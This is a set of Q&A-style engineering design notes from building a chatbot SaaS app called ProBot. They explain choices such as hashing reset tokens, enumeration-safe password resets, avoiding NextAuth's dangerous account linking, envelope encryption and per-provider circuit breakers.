The standard SaaS clause is "liability capped at amount paid in the last 12 months." For a free product that's $0, which courts can interpret as "no meaningful cap" - leaving you exposed to the jurisdictional default. A nominal $1 cap is the workaround: a real, enforceable number that's still effectively no liability. It's a contract-drafting convention, not an actual money flow.

> Why use a (parenthesized) Next.js route group for marketing pages?

Next.js App Router treats `(name)` directory names as routing-only sugar - they group files under a shared layout without appearing in the URL. So `src/app/(marketing)/about/page.tsx` resolves to `/about`, not `/marketing/about`. The benefit is one place to put the shared `<SiteHeader>` + `<SiteFooter>` chrome (the layout.tsx inside the group) that applies to /about, /privacy, /terms but NOT to the landing page, dashboard, or auth pages - each of those needs different chrome.

The alternative - repeating `<SiteHeader />` and `<SiteFooter />` in every page file - works but duplicates the import and JSX in every legal page. As the nav grows or shifts (adding "Pricing" or "Changelog"), every page-level copy drifts unless updated together. Route groups make "shared chrome" a structural fact, not a discipline.

The landing page (`src/app/page.tsx`) is intentionally OUTSIDE the (marketing) group because its layout was already inlined and rewriting it to use the group's layout would mean either (a) moving page.tsx into the group (and breaking the `/` URL - would resolve to `/(marketing)` which Next does collapse to `/`, but only one route can own `/`) or (b) accepting a small diff and just importing the shared components directly. Option (b) was the surgical choice here.

---

### Hashing One-Shot Auth Tokens Even Though They're Already Random (Stage 7 Phase 1)

> Why store SHA-256 of a password-reset token in the database instead of the raw token? The token is already 32 random bytes - what attack does hashing prevent?

The token is high-entropy, yes, but the threat model isn't "guess the token." The threat is **database leak / SQL injection / backup theft**. If you store raw tokens and an attacker reads the `password_reset_tokens` table, they can immediately replay every unexpired token against your API - effectively a password-reset bypass for every active reset request. Storing only `sha256(token)` makes the dump useless: the API computes `sha256(suppliedToken)` and looks it up; an attacker with hashes alone has no way to invert the hash back to a token the API will accept.

The same logic applies to email-verification tokens, magic-link tokens, session cookies, API keys, OAuth refresh tokens - basically any "bearer" credential. The pattern is: **the system that issues the credential keeps the secret in memory just long enough to hand it to the user; the system that validates the credential stores only the hash.** Concretely:

- `createResetToken()`: `raw = randomBytes(32).toString("hex")` → `tokenHash = sha256(raw)` → INSERT `{ tokenHash }` → return `raw` to the caller. The caller embeds `raw` in the email link.
- `validateAndConsumeToken(raw)`: SELECT WHERE `tokenHash = sha256(raw)` → check expiry + `usedAt` → UPDATE `usedAt = now`.

The raw token only exists in memory and in the email body. The DB only ever sees the hash.

Why specifically SHA-256 and not bcrypt? Bcrypt's slow-by-design is what you want for passwords because attackers brute-force them. Random 32-byte tokens are infeasible to brute-force in the first place (2^256 keyspace), so the slowdown buys nothing. SHA-256 is fast enough to validate on every request without budget impact, while still being one-way. Use bcrypt for passwords (cracking matters), SHA-256 for random tokens (replay matters).

The cost of this pattern is tiny - one extra `crypto.createHash("sha256")` per token operation, well under 1ms. The benefit is that a stolen DB dump is operationally useless against the auth flow, which is a load-bearing security guarantee.

### `used_at` vs Delete-On-Consume: When To Audit-Trail A Consumed Token (Stage 7 Phase 1)

> The verification-token table doesn't have a `used_at` column - it just deletes the row on consume. The reset-token table sets `used_at` instead. Why the inconsistency?

It's not inconsistency, it's intent. Both designs make the token single-use; they differ in what they preserve for after-the-fact analysis.

- **Verification tokens**: a successful verify means "yes, you control this inbox." The token has no further role. Keeping a `used_at` row buys nothing - you already know the user is verified because `users.email_verified` is now set. The clean delete keeps the table small and the indexes lean.
- **Reset tokens**: keeping the row with `used_at` set lets you forensically detect "this token was consumed twice" if a leaked token is ever attempted by an attacker after the user already used it. The first consume sets `used_at`; the second consume queries the same row, sees `used_at IS NOT NULL`, returns "already used." You can then audit those "already used" failures in the logs to detect attempted replay attacks. The signal is small but real.

The general principle: **a consumed credential should be deleted unless its post-consume state has forensic value.** Auth tokens that are part of a single user-state transition (verification, signup confirmation) lose their value the moment they're consumed. Auth tokens that protect a more-sensitive action (password reset, key rotation, account deletion) deserve the audit trail.

A related pattern: rate-limit tables typically retain consumed entries until expiry for exactly this reason - being able to see "this IP made 50 attempts in the last hour" is the entire point. Token tables where the act of consuming completes the transaction (verification) gain nothing from retention. Token tables where consuming might be the start of a sensitive transaction (reset) gain forensic insight from retention.

### Enumeration-Safe Forgot-Password (Stage 7 Phase 1)

> The forgot-password endpoint returns 200 even when the email doesn't exist. Why not return 404 for unknown emails - wouldn't that be more honest?

It would be more honest in a vacuum, but it would also create an **account-enumeration oracle**. An attacker who wants to know "is this person registered on ProBot?" sends `POST /api/auth/forgot-password { email }` and reads the response code. A 404 means "no, this email isn't registered"; a 200 means "yes, it is." Now the attacker has a confirmed list of registered emails to target with phishing, credential-stuffing, or social engineering ("hey, since you have a ProBot account...").

The mitigation is "always answer 200, regardless of state." The reset email only goes out if the email exists; the response is indistinguishable either way. The UX cost is small - a user who typos their email won't get a "this isn't registered" error, they'll just never receive the email. That's worth it for the security gain.

A subtler version of the same trap: returning a different response for "no password to reset" (OAuth-only accounts) vs "no such email" leaks _which authentication method_ a given email uses. Same fix: silently no-op for OAuth-only accounts, return 200, send no email. The attacker can't distinguish the two cases from outside.

A third version of this trap is timing-based. If the "send email" path takes 200ms and the "do nothing" path takes 2ms, the attacker can time the response to infer state. Mitigation depends on the threat model: for low-traffic apps, accept the timing leak; for high-stakes apps, add a `setTimeout` floor or run the work in a `setImmediate` so the response is detached from the work. ProBot is in the "low-traffic, accept the leak" tier - the timing difference is dominated by network jitter at our scale.

The pattern generalizes: **anywhere your API's response shape differentiates between "this resource exists" and "this resource doesn't," you have an enumeration oracle.** Login forms have the same problem ("wrong password" vs "no such email" - both should map to one error). Password-reset is the highest-leverage place to apply this discipline because the cost of fixing it is one early-return rewrite and the cost of NOT fixing it is a confirmed-user-list that lives forever in attacker hands.

### `useSearchParams` Forces `<Suspense>` In Next.js 14 (Stage 7 Phase 1)

> The build broke with "useSearchParams() should be wrapped in a suspense boundary at page /login." The component compiled fine in dev mode but failed during static export. Why?

Next.js 14 statically pre-renders pages at build time unless they explicitly opt into dynamic rendering. The pre-render happens without query parameters because, well, there are no query parameters at build time. If a client component calls `useSearchParams()` during the initial render, Next.js doesn't know whether to (a) pre-render assuming empty params, or (b) bail out of pre-rendering entirely.

The contract Next.js settled on: **if you read `useSearchParams()`, you must wrap the component in `<Suspense>`.** The suspense boundary is the contract that says "I understand this subtree's render depends on client-side data; show the fallback during pre-render, hydrate the real content on the client." Without the boundary, Next assumes you wanted to pre-render and forces you to surface the dependency explicitly.

The fix is mechanical:

```tsx
import { Suspense } from "react";
import { LoginForm } from "@/components/auth/LoginForm";

export default function LoginPage() {
  return (
    <Suspense fallback={<LoginFormFallback />}>
      <LoginForm />
    </Suspense>
  );
}
```

The fallback should be a static, no-params version of the form's chrome - ideally rendering the same headings and skeleton so the visual layout doesn't shift on hydration. This is also a useful exercise in separating "the chrome that doesn't depend on URL state" from "the interactive form that does," which is good componentization regardless of Next's rules.

The dev-mode-vs-build-mode discrepancy is the trap. In `next dev`, every render is server-rendered on demand, so the search-params read works fine. The error only surfaces during static generation, which doesn't happen until `next build`. Always run a real build before assuming a feature is shippable - `tsc --noEmit` and unit tests both pass for this kind of issue.

The same pattern bites with `cookies()`, `headers()`, `useParams()` in certain configurations, and any other hook that reads request-time state. The fix is always the same: a `<Suspense>` boundary that establishes a contract about the dependency.

### `allowDangerousEmailAccountLinking: true` Is A Cross-Provider Takeover Vector (Stage 7 Phase 1)

> NextAuth's `allowDangerousEmailAccountLinking: true` flag has "dangerous" in the name but the docs make it sound like a quality-of-life feature. What's actually dangerous about it?

NextAuth's default behavior is: if someone signs in with Google and the email matches an existing account that was created via GitHub, NextAuth **refuses to link them automatically** and surfaces an `OAuthAccountNotLinked` error. The reason is account-takeover prevention.

Imagine I register on ProBot via GitHub with the email `jane@example.com`. Six months later, Jane (who controls the actual `jane@example.com` Google account) discovers the app, clicks "Sign in with Google," and Google sends a successful auth back to ProBot for `jane@example.com`. If `allowDangerousEmailAccountLinking: true`, NextAuth says "an account with this email already exists, let me link the Google account to it" - and Jane is now signed in as me. She has full access to my bots, my conversations, my leads. She didn't need my GitHub password, my session cookie, or anything else. She just needed to own the email.

The default behavior (the safe one) prevents this: Jane gets the `OAuthAccountNotLinked` error and is told to sign in with the original method first. She can then add Google as a second auth method from her settings, having proven control of the original method first.

The "dangerous" prefix is doing real work. The flag is sometimes useful for apps where:

- All accounts trace back to a verified-email source (e.g., the only sign-up path is email-verification, so by definition only one person controls each email), AND
- The convenience of "any provider with the matching email signs you in" outweighs the takeover risk.

ProBot doesn't qualify on either count. The fix is one line: remove the flag. NextAuth's existing `/auth/error` page already handles the `OAuthAccountNotLinked` error code; the message reads "this email is already linked to another sign-in method, sign in with that method first." Clear, no UX gap, no security gap.

The general lesson: **flags named "dangerous_X" or "force_X" or "unsafe_X" in mainstream auth libraries are not pejorative - they're warnings that the library author already considered and rejected the default they're letting you re-enable.** Read the linked docs before flipping any such flag; the docs usually describe the exact attack the default prevents.

---

### Roll Your Own HMAC Token Or Reach For A JWT Library? (Stage 7 Phase 2)

> The preview-token module skipped `jose` and `jsonwebtoken` and signed a small payload with raw `crypto.createHmac`. When is that the right call vs. just adding the library?

Reach for a full JWT library when you need any of these:

- **Algorithm negotiation.** RS256 vs ES256 vs HS256 chosen per-token, with a JWS header that says which to use. Useful for federated systems where you don't control both ends.
- **Key rotation envelopes.** A `kid` header that names the signing key so you can rotate secrets without invalidating outstanding tokens.
- **Standard claims.** `aud` (audience), `iss` (issuer), `sub` (subject), `jti` (token id), `exp` / `nbf` (not-before) - and you need other systems to recognise them.
- **JOSE encryption (JWE).** Encrypted-not-just-signed tokens.

Skip the library when, like ProBot's preview tokens, all of the following are true:

- You sign and verify on the same server with the same secret.
- The payload is tiny (botId + userId + iat - three primitives).
- TTL is enforced in code at verify time, not via a standard `exp` claim other systems would read.
- No second party ever inspects the token; it's a server-controlled bearer credential, not an interop envelope.

The "skip" path is ~30 lines:

```typescript
const encoded = base64url(JSON.stringify(payload));
const sig = createHmac("sha256", secret).update(encoded).digest("base64url");
const token = `${encoded}.${sig}`;
```

…and verify is the reverse with `timingSafeEqual` on the signature. That's `crypto.createHmac` + JSON.stringify + base64url, all from the Node standard library. Bundle cost: zero.

The cost of adding `jose` for this case is non-trivial: ~40-60KB minified to the serverless bundle, a dependency-graph node to audit forever, and a much wider API surface where you have to read the docs every time you touch it. The cost is justified the moment you need any of the bullets above; it is not justified for "I want a signed cookie."

The trap to avoid is using JSON Web Tokens as a noun ("we need a JWT") when you mean "we need a signed credential." Signed credentials are a primitive, JWTs are one specific format. Picking the format before the requirement is backwards.

### Two-Layer Token Validation: Signature + Server-Side State (Stage 7 Phase 2)

> The chat route verifies the preview token's HMAC AND checks that the token matches `bots.previewToken` in the row. Why both? Either alone seems sufficient.

Each layer fixes a different failure mode of the other.

**Signature alone (stateless tokens):** an attacker who steals a signed token has access until the TTL expires. There is no server-side state to revoke. If you publish the bot, the token still works. If the user discovers a leak, there is nothing they can do but wait it out. This is the JWT model - and it's why "JWT revocation" is a famous pain point in the JWT ecosystem (the usual answers are short TTLs + denylists, both of which add complexity).

**Server-side state alone (random opaque tokens):** an attacker who guesses or steals the token also has access. The token's value is the entire authentication; the server can't tell whether the token is the one it issued or a different-but-also-valid value. Random 32-byte tokens are practically unguessable, so this isn't a real attack - but it does mean the token _can_ be replayed from a DB dump because there's no cryptographic binding to the system that issued it.

**Both layers:** the signature proves the token was issued by this system (cryptographic provenance). The DB lookup proves the token is _currently_ valid (operational revocation). Publishing a bot clears the DB row → token instantly stops working even if it's signed correctly. The DB row matches a signature an attacker can't forge → a leaked DB dump alone can't generate working tokens.

For ProBot's preview tokens both layers were cheap (we already have the bot row in scope; the HMAC verify is microseconds), so we use both. Pure-stateless JWTs are appropriate when the DB lookup cost is the bottleneck (think: edge-function auth where every request hits a CDN, never the DB). Pure-stateful opaque tokens are appropriate when you don't need cryptographic provenance - e.g., session cookies inside one trust boundary.

The mental model: **signature = "did we issue this?"; DB row = "do we still want it to work?"** Use the layer that answers the question your threat model cares about. When both questions matter, use both - it's free.

### Why Drafts Need `robots: { index: false }` Even Behind A Signed URL (Stage 7 Phase 2)

> The preview URL is signed and tokenised. Crawlers don't have the token. Why bother setting `robots: { index: false }`?

Crawlers don't have the token - but they sometimes get the URL.

Common ways a preview URL leaks to a crawler:

- A creator pastes the link into a public GitHub issue, then forgets and never deletes the comment. GitHub fetches the URL to render a preview card. Bingo, it's in the bot's index.
- A creator shares the link in Slack. Slack's link-unfurl bot fetches the URL server-side. If the workspace allows external sharing, that link unfurl can end up in archive systems that get crawled.
- The creator sends the link via email. Their email client (Outlook/Gmail) fetches the URL to generate a preview. Those preview-fetcher User-Agents have shown up in indexes before.

The robots meta tag tells well-behaved crawlers "don't put this in your index even if you fetch it." Most major crawlers (Googlebot, Bingbot) respect it. Malicious or sloppy crawlers don't - but those crawlers also wouldn't respect the auth token; they'd just request the URL and get the page back with full chat UI rendered.

So `robots: { index: false }` is the **most you can do at the page layer** for an URL that, by design, can be opened by anyone who has it. It's a defence against accidental indexing of links that leaked through normal-human channels (paste in a doc, share with the wrong person). It's not a defence against scrapers, which is fine - drafts aren't sensitive enough that scrapers are part of the threat model.

The general rule: **anything reachable without a session cookie should explicitly set `robots: { index: false }` unless you actually want it indexed.** This includes preview pages, password-reset success pages, email-verification confirmation pages, and short-lived sharing links. The cost is one line in `generateMetadata`; the benefit is the page not showing up in Google when something inevitably leaks.

### Per-Bot Rate Limit Overrides: Two Layers Of Clamping, On Purpose (Stage 7 Phase 2)

> The `RATE_LIMIT_PER_MINUTE_MAX = 100` ceiling appears in both the Zod schema (`.max(100)`) and the rate-limiter (`clampPositive(..., 100)`). Why duplicate it?

Each layer covers a hole the other can't see.

**Zod-only (write-time clamp):** safe as long as every write to `bots.rate_limit_per_minute` goes through the PATCH endpoint. The moment someone writes to that column another way - an admin script, a data backfill, a future "import bot from JSON" feature, the Drizzle Studio UI you opened on Tuesday - the schema is bypassed. The DB happily stores `999999` because the column is just `integer`. The runtime then dutifully tries to allow 999,999 requests per minute and burns through someone's API credits.

**Limiter-only (read-time clamp):** safe as long as you never look at the stored value for any other purpose. The moment a UI element renders "rate limit: 999,999 requests per minute" from the DB value, you've lied to the user about what's actually enforced. The Zod write-clamp catches the bad value at write time so users never see misleading state.

**Both layers:** the Zod schema gives accurate user-facing values (settings page shows "max 100" because you can't write higher); the limiter gives runtime safety regardless of how the value got there. Cost is one constant referenced in two places - well worth it.

The pattern generalises: **any value that has both a "what the system enforces" interpretation and a "what the user sees" interpretation should be clamped at both layers.** Examples: max file size (validated by the upload form AND enforced by the multipart parser); max message length (truncated client-side AND server-side); password complexity rules (checked at the form AND on the server). The two halves can't drift if you reference a single constant from both - but if they could drift, you have a UI/backend lie waiting to happen.

The cheap version of this discipline: **export a single constant, import it in both places, and add a unit test that imports both and asserts equality.** The thorough version is a property-based test that fuzzes the input and asserts the eventual stored value never exceeds the ceiling - but for a single integer constant, the cheap version is sufficient.

### Append-Or-Insert: When To Mutate The Just-Created Row (Stage 7 Phase 2)

> The bot-create handler INSERTs the row, then immediately UPDATEs it with the preview token (which needed the bot id to sign). Two statements per create feels wrong. Why not mint the token from a pre-generated UUID?

This is a real choice with a clear trade.

**Option A: Mint token before insert, supply your own UUID.**

```typescript
const botId = randomUUID();
const previewToken = mintPreviewToken(botId, userId);
await tx.insert(bots).values({ id: botId, previewToken, ... });
```

One statement. Tight. But: you're now mixing two responsibilities. The bot id is no longer "what Postgres gave us"; it's "what we minted client-side." If anyone refactors the schema to use a sequence, a CUID, ULID, or to require a database-generated value (e.g., `gen_random_uuid()` with a deferred constraint), this code silently drifts. Tests now have to fix the bot id at insert time, which is fine but quietly couples test fixtures to a generator that lives in app code.

**Option B: Insert then update.**

```typescript
const [created] = await tx.insert(bots).values({ ... }).returning();
const previewToken = mintPreviewToken(created.id, userId);
await tx.update(bots).set({ previewToken }).where(eq(bots.id, created.id));
```

Two statements. Slightly less tight. But: the bot id stays a database-generated value (single source of truth). Each statement does one thing. Future schema changes (the sequence/CUID/ULID example) don't require app-code changes. Both statements run inside the same transaction so partial state is impossible.

Both options are correct. ProBot picked B because:

1. The trade is _one extra round-trip inside a transaction_, which is microseconds on the same DB connection.
2. The code reads "insert, then update with derived value" which matches how a human would describe it.
3. The schema can change without coordinated app changes.

When to pick A instead: high-throughput insert paths (millions per minute), where the extra round-trip dominates. ProBot's bot-create path is at most a few times per session - the perf consideration doesn't apply.

The general principle: **don't pre-compute database-generated values just to save a statement, unless the perf actually matters.** The statement count is rarely the right cost to optimise for. Architectural simplicity - keeping each statement's responsibility narrow - usually wins.

---

### Envelope Encryption: Why The Two-Key Pattern Beats Encrypting Everything Under One Key (Stage 7 Phase 3)

> The code generates a fresh random DEK (Data Encryption Key) per bot, uses that to encrypt the LLM key, then encrypts the DEK itself with a KEK (Key Encryption Key) loaded from an env var. Why not just AES-encrypt the LLM key directly under the KEK and skip the DEK?

Three independent reasons, each enough on its own:

1. **Per-bot key isolation.** Every bot has its own DEK. If a single DEK is somehow extracted (memory dump during a chat call, hypothetical AES side-channel), the blast radius is one bot - not every encrypted key in the database. Encrypting everything directly under the KEK means one extraction compromises every key.

2. **KEK rotation without re-encrypting payloads.** Rotating the KEK quarterly (per the spec) requires re-keying every stored payload. With envelope encryption, rotation is "decrypt each wrapped DEK with the old KEK, re-encrypt with the new KEK." The actual data ciphertext (the much larger blob) stays byte-identical. Without the DEK layer, rotation means decrypting and re-encrypting the actual ciphertext for every row - same amount of work but bigger I/O and more chance of partial-write disasters.

3. **Pluggable KEK source.** Envelope encryption is the standard pattern that lets you swap the KEK out for a KMS-managed key later (AWS KMS, GCP Cloud KMS, HashiCorp Vault Transit) without changing the data shape. The KMS only ever sees the wrapped DEKs (small, fast to encrypt/decrypt remotely); your application keeps doing local AES with the unwrapped DEKs at full speed. Without the envelope, every data decrypt becomes a KMS round-trip.

The cost of envelope encryption is one extra 32-byte AES-GCM operation per encrypt/decrypt - measurable in microseconds. The benefit is rotational agility + isolation + extensibility. The pattern is so universally beneficial that AWS, GCP, Azure, and every serious password manager all use it. Skipping it is almost always wrong unless you genuinely have one tiny thing to encrypt and no rotation requirements.

The mnemonic: **DEK protects the data, KEK protects the DEK.** Lose the data → minor (one item compromised). Lose the DEK → bounded (one bot). Lose the KEK → catastrophic (everything). Operational practice flows from this: KEK in env var (rotation = redeploy), DEKs in DB alongside ciphertext, data in DB ciphertext. Each layer has different access patterns and different rotation cadences.

### "DB Dump Alone Cannot Decrypt": The Threat Model That Justifies This Design (Stage 7 Phase 3)

> The marketing copy promises "if our database is leaked, your keys remain unreadable - even to us." How is that actually true given we hold the KEK?

The promise is specifically about **database leakage**, not full infrastructure compromise. Those are very different threat models:

- **DB dump leaked / SQL injection / backup theft / read-only DB query access:** attacker has ciphertext + wrappedDek. Both useless without the KEK. KEK is in `PROBOT_KEY_ENCRYPTION_KEY` env var, which lives in the deployment environment (Vercel/server filesystem), not in the database. ✓ Promise holds.
- **App code access (read-only repo):** KEK isn't in code, just the env-var name. ✓ Promise holds.
- **Sentry/logger access:** middleware strips `x-llm-api-key` and the `redactSensitive` helper redacts decrypted-key-shaped values from logged objects. ✓ Promise holds.
- **Full infra access (Vercel project owner / IAM admin):** can read the KEK from env vars and decrypt anything. ✗ Promise does NOT hold. This is true of every operator-managed system short of confidential computing / TEE.
- **RCE on the running Node process:** process has KEK in memory; attacker on the host could read it. ✗ Mitigated by hardening, not eliminated.

The honest framing - which the marketing copy reflects - is "if our database is leaked, your keys remain encrypted and unreadable." That's a _bounded_ promise. The operator caveat is explicit: "If even that level of trust is unacceptable to you, self-host ProBot - your key never leaves your own server."

The general principle: **be precise about which threats your encryption defends against.** Vague claims like "we use encryption" or "your data is secure" don't mean anything. Stating the threats addressed (DB dump, code leak, log leak) and the threats not addressed (full infra compromise, RCE, TEE-free runtime) is the honest version. Users with stricter threat models can then make informed choices (self-host, BYO infra, encrypt client-side before sending).

A related anti-pattern: marketing teams ask engineering for "zero-knowledge encryption" to put on the landing page. Zero-knowledge has a specific meaning (the server cannot decrypt under any conditions, typically because the user's password is the encryption key and the server never sees it). It almost never applies to features where the server needs to use the decrypted data (like calling an LLM with the user's key). Sticking with "envelope-encrypted at rest, decrypted only in-memory per request, never logged" is accurate; using "zero-knowledge" would be a lie that an informed attacker (or security blogger) would call out.

### Don't Cache Env Vars In Module Scope; And Other Env-Var Test Hygiene (Stage 7 Phase 3)

> The envelope encryption tests manipulate `process.env.PROBOT_KEY_ENCRYPTION_KEY` aggressively across tests. The chat route test imports the encryption module that also reads that env var. Both work - how?

Three independent disciplines made this work; each is worth internalizing.

**Discipline 1: don't cache env vars in module scope.** The envelope module's `getKek()` does `Buffer.from(process.env[KEK_ENV_VAR], "base64")` on every call. If we cached the result in `let cachedKek: Buffer | null = null`, the chat-route test would import the module with one env value, then a later test that sets a fresh value would still see the cached buffer. Module-level caches are a common test-isolation footgun. The fix is either "don't cache" (chose this - microsecond cost) or "expose a `__resetCache()` test helper" (more boilerplate, easier to forget).

**Discipline 2: per-test env restoration via `afterEach` (or `afterAll`).** Each test that mutates `process.env` records the original value at suite start (`const ORIGINAL = process.env.X`) and restores it in cleanup. Without this, a test that sets `KEK = "abc"` leaks that value into every subsequent test in the same worker, including tests in completely unrelated files (vitest reuses worker processes across files for performance).

**Discipline 3: skip module-load-time validation under test runners.** The envelope module hard-fails at import if the KEK env var is set but malformed. In production this catches deploy-time configuration errors. In tests it would mean "every test file that imports this module crashes during test discovery if the env happens to be set with a value tests don't like." The fix is a runtime check inside the validation that skips when `process.env.NODE_ENV === "test"` or `process.env.VITEST === "true"`. The `VITEST` env var is set automatically by vitest; `NODE_ENV=test` is the universal convention. Together they cover any test environment.

The discipline that prevents all of these: **assume test-isolation breakage by default; explicitly restore any global state mutated.** Tests are programs that share an interpreter; anything that survives between tests will eventually bite you.

### Audit Logs Should Record Outcomes, Not Attempts (Stage 7 Phase 3)

> The decrypt audit log only writes a row AFTER `provider.complete()` succeeds, not at the moment of decrypt. Why not record the decrypt itself as the audit-worthy event?

Two reasons, both empirical:

**Reason 1: noise inflates the metric the creator cares about.** The creator wants to know "how often is my managed key being used to serve recruiters?" Recording the decrypt at the moment it happens means counting:

- Successful chats (the thing they actually care about)
- Failed provider calls (network blips, malformed bot config)
- Rate-limited requests (the recruiter hit the limit; no real "use")
- Sanitization failures (the message was blocked before reaching the provider)

A dashboard saying "your key was decrypted 47 times in the last 24 hours" sounds alarming if 30 of those were rate-limited or sanitized-blocked. Recording post-success means the count is "successful chats served," which is the operationally useful number.

**Reason 2: the audit log is more usefully scoped to "key actually used at the provider edge."** The creator's threat model is "did someone abuse my key against the provider?" Pre-success decrypts are just internal-system events - they don't constitute "use" from the LLM provider's billing perspective. Post-success decrypts correspond 1:1 with provider API calls (which is what's actually costing the creator money).

The general principle: **audit logs answer questions, not record activity.** Decide what question the audit log is supposed to answer ("how often was my managed key used to serve a real chat?") and write rows when that question gets a yes. Recording every internal step would be useful for debugging but isn't what an audit-log surface is for; debugging telemetry is a different surface (and arguably shouldn't include user-identifying data at all).

A common related antipattern: logging "the user tried to do X" before doing X, then NOT logging "X succeeded/failed." The audit log becomes a list of attempts with no resolution, which is worse than useless because it implies action where there was none. Always pair attempt-logs with outcome-logs, or skip the attempt-log entirely and only log outcomes.

### `useEffect` Fetch In Client Component vs Server-Component Data Loading (Stage 7 Phase 3)

> The new AIModelKeyTab fetches the audit log via `useEffect` + `fetch` on mount, but the rest of the dashboard fetches data in the server component and passes it down. When is each the right pick?

Both have valid use cases; the question is "is this data more useful fresh or pre-rendered?"

**Server-component fetch (the rest of the dashboard's pattern):**

- Renders in the initial HTML - no loading flash, no extra round-trip.
- Cacheable at the edge if the request is GET + the cache headers are right.
- Data is as fresh as the page-render moment, then stale until the user re-navigates.
- Trades off freshness for first-paint speed.
- Good for: bot list (changes on user action), bot config (changes on user action), user profile (changes rarely).

**Client useEffect fetch (the AIModelKeyTab pattern):**

- Initial HTML has a loading state; data populates after hydration.
- Re-runs when the component re-mounts (e.g. after a router.refresh()).
- Easy to wire up "refresh after an action" without re-rendering the whole page.
- Good for: data that changes from external events (recruiters chatting → audit log grows), data that the user just modified in the same component (store key → re-fetch to update the "stored" pill), data that's bot-specific and updates often.

The audit log fits the second pattern perfectly: it updates whenever a recruiter chats with the bot (which happens independently of any dashboard action), and the user wants to see fresh data when they explicitly look at the tab. Putting it through SSR would mean every "go to settings → click model tab" navigation triggers a DB query, and the data is still stale the moment the user lands on it.

The general principle: **server components for "what's true right now at navigation time," client effects for "what's true since I last looked."** When in doubt, the SSR path is the default - it's faster to render and easier to test. Reach for client fetch when the freshness gap actively hurts the UX.

A related pattern that's worth knowing about but didn't fit this case: SWR (`stale-while-revalidate`) libraries like `swr` or `react-query` give you the best of both - render the cached value immediately, fetch in the background, update when fresh. Worth considering when the dashboard grows beyond ~3 client-side fetched panels, but overkill for one tab.

---

### Circuit Breakers: Three States, Two Costs, One Goal (Stage 7 Phase 4)

> The circuit breaker has three states - closed, open, half-open. Closed means "let calls through," open means "fail fast." What does half-open actually do that closed-after-cooldown wouldn't?

The half-open state exists to answer one question: **is the upstream actually recovered, or are we just past the cooldown timer?**

The naive design - "open for N seconds, then go back to closed and let traffic flood through" - has a failure mode. Imagine a provider that goes down at T=0, stays down for 5 minutes, then comes back up. With a 30-second cooldown, the breaker opens at T=0+5s (after the 5 failures), expires its cooldown at T=35s, closes, accepts traffic, hits 5 more failures (the provider is still down), and re-opens at T=70s. The traffic during T=35..70 was wasted - 5+ requests slammed an already-known-bad provider just to discover what we already knew.

The half-open state replaces "let traffic flood" with "let ONE call through as a probe":

- Probe succeeds → upstream is back → close → resume full traffic.
- Probe fails → upstream is still broken → open for another full cooldown.

The cost during half-open is **at most one wasted call per cooldown window**, not "potentially every call in flight." For a chat product where each call is a recruiter waiting on a response, that's the difference between "one recruiter sees a polite retry message" and "ten recruiters see broken UX in the first 100ms after the breaker tries to recover."

The second cost the breaker controls: **load on the recovering upstream.** A provider recovering from an outage doesn't want a wall of pent-up traffic the instant it comes back. One probe says "I'm checking" without piling on. If the upstream is fragile (say, recovering from a database failover), the trickle of probes is what lets it stay up; a flood would knock it back down.

The general principle: **breakers protect both YOU (fail fast, don't waste calls) AND THE UPSTREAM (don't pile on a recovering service).** A breaker that only does the first is a glorified timeout; a breaker that does both is operational hygiene.

A related pattern worth knowing: **bulkheads** isolate failure modes by capping concurrent calls to one upstream (so a slow upstream can't exhaust your thread pool / connection pool). Breakers and bulkheads compose: bulkhead caps concurrent in-flight calls, breaker stops launching new ones when failure rate spikes. Stage 7 only needs the breaker; bulkheads become relevant if/when we have multiple slow upstreams competing for the same finite resource pool.

### Why The Breaker Key Should Be The Upstream, Not The Caller (Stage 7 Phase 4)

> The circuit breaker is keyed on `ownerRow.llmProvider` (the provider name), not on `bot.id`. Why? Per-bot breakers would isolate failures more granularly.

The opposite of what it sounds like. Per-bot breakers make the system _worse_ because they don't share knowledge of the upstream's state.

Imagine Anthropic goes down. 100 bots use Anthropic. With per-bot breakers, each of those 100 bots has to independently learn the outage:

- Bot 1: 5 failures → opens.
- Bot 2: 5 failures → opens.
- ...
- Bot 100: 5 failures → opens.

That's 500 wasted calls to Anthropic, 500 recruiters seeing real errors, and 500 chat-route trips that could have been fail-fast 200s with the friendly fallback. All to learn what the first 5 failures already proved: Anthropic is down.

Per-provider breakers fix this by sharing the discovery: the FIRST 5 failures (across any bot using Anthropic) trip the breaker, and every subsequent call to any Anthropic-using bot fail-fasts for the cooldown window. 5 wasted calls, not 500.

The mental model: **the breaker key should match the granularity of the failure mode.** If the failure is "this specific user's account is locked out," key on user id. If the failure is "the database is down," key on database connection. If the failure is "Anthropic's API is unavailable," key on the upstream API.

A test for this: **what's the smallest unit that, when it fails for one caller, will also fail for every other caller?** That's your breaker key. In our case, an Anthropic outage will make calls fail for every Anthropic-keyed call regardless of which bot is making them; the smallest "everyone fails together" unit is "the provider." Hence the key.

A counterpoint worth noting: **per-credential breakers** (one breaker per stored API key) would catch the case where a single user's key is revoked / over-quota without breaking calls for users with valid keys. We don't do this in Phase 4 because the chat route already catches per-key failures (`invalid_key`, `rate_limit`) and surfaces specific errors for them; the breaker is reserved for "the upstream itself is broken," which is genuinely per-provider. If the user-facing distinction ever blurs, per-credential breakers would be the right next step.

### Graceful Degradation: 200 With A Fallback Beats 502 Every Time (Stage 7 Phase 4)

> The chat route returns a 200 with a "temporarily unavailable" reply when the circuit is open, rather than a 5xx. Doesn't that hide the failure from monitoring?

It moves the failure from "broken UX visible to recruiters" to "tracked event visible to operators" - which is the right place for it.

The two design choices map cleanly to two recipients:

**5xx response** sends "something is wrong" to the **client**. The browser's fetch sees a non-2xx, the React component renders an error toast, the recruiter sees a broken page. The failure is visible to the person who least needs to know about it and can do least with the information.

**200 + fallback reply** sends "something is wrong" to the **operator**. The recruiter sees a polite "I'm temporarily unavailable, please try again" message (their UX is degraded but not broken). The dashboard's conversation count still ticks up. The `fallback: "circuit_open"` discriminator in the response body becomes a Sentry breadcrumb / metric / log line that the operator can see and act on. The failure ends up where it's actionable.

The trade is that you have to actively _measure_ fallbacks for the signal to surface. A 5xx shows up in error dashboards automatically; a 200-with-fallback only shows up if you explicitly count `fallback !== undefined` responses. The latter requires more discipline but produces a much better recruiter experience.

For consumer-facing systems, the rule of thumb: **fail fast internally, fail soft externally.** Internal systems (e.g., an admin batch job hitting an API) get the raw error so the operator can fix it. External systems (e.g., the chat widget) get a polite degraded response so the user keeps using the product.

